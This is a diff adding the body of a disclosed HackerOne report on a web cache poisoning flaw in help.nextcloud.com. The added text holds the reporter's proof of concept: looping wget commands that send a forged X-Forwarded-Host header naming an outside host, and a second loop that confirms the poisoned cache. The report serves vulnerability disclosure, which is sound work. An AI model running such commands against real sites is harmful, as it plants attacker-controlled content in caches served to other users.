@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2020-01-31
 submitted: 2018-10-27T19:33:02.896Z
 bounty_usd: null
@@ -24,6 +25,37 @@ title: "https://help.nextcloud.com::: Web cache poisoning attack"
 - Report: [https://hackerone.com/reports/429747](https://hackerone.com/reports/429747)
 - CWE: N/A
 - Submitted: 2018-10-27T19:33:02.896Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hi there,
+I just found the website:
+https://help.nextcloud.com
+is infected with "Web cache poisoning"
+Abuse this bug, Attacker can:
+1. Poison your cache with HTTP header with XSS included. This attack may leads to Stored XSS
+2. Poison your website contains malware url (cache poisoned by attacker), maybe the user's browser (like Firefox, Chrome) will block your website (https://help.nextcloud.com)
+
+How to reproduce the issue:
+
+    In the 1st terminal, run command likes this: 
+$ while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done
+    In the 2nd terminal, run command below for confirmation this attack is successful: 
+while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done
+
+Finally, this link bellow: https://help.nextcloud.com/?qwKzzSR=649227948379 was infected with "Web Cache poisoning attack".
+Please see the attached image for details.
+
+Impact
+Stored XSS attack, deface website ....
+Cheers,
+~g4mm4
+
+## Impact
+
+Stored XSS attack, deface website, phishing for funs :)
 
 ## Timeline
 
